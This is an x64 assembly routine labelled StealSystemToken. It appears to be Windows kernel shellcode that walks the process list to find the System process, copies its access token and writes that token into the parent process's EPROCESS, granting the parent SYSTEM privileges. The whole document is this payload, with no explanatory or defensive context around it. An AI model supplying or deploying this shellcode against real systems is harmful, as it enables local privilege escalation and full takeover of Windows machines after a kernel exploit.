StealSystemToken:
    push    rdi ; Save rdi
    push    rsi ; Save rsi
    push    rcx ; Save rcx
    push    rax ; Save rax

    mov     rdi, qword gs:[0x188]   ; rdi = Current KTHREAD
    mov     rdi, qword [rdi+0x70]   ; rdi = Current EPROCESS
    mov     rcx, qword [rdi+0x188]  ; rcx = ActiveProcessLinks
    mov     rdi, qword [rdi+0x290]  ; rdi = InheritedFromUniqueProcessId

Loop1:
    mov     rcx, qword [rcx]        ; rcx = ActiveProcessLinks.Flink
    mov     rax, qword [rcx-0x8]    ; rax = UniqueProcessId
    cmp     rax, 0x4                ; UniqueProcessId == System
    jne     Loop1                   ; Loop

    mov     rsi, qword [rcx+0x80]   ; rsi = SystemToken | _EX_FAST_REF
    and     sil, 0xf0               ; rsi = SystemToken

Loop2:
    mov     rcx, qword [rcx]        ; rcx = ActiveProcessLinks.Flink
    mov     rax, qword [rcx-0x8]    ; rax = UniqueProcessId
    cmp     rax, rdi                ; UniqueProcessId == InheritedFromUniqueProcessId
    jne     Loop2                   ; Loop

    mov     qword [rcx+0x80], rsi   ; ParentProcessToken = SystemToken

    pop     rax ; Restore rax
    pop     rcx ; Restore rcx
    pop     rsi ; Restore rsi
    pop     rdi ; Restore rdi
    retn    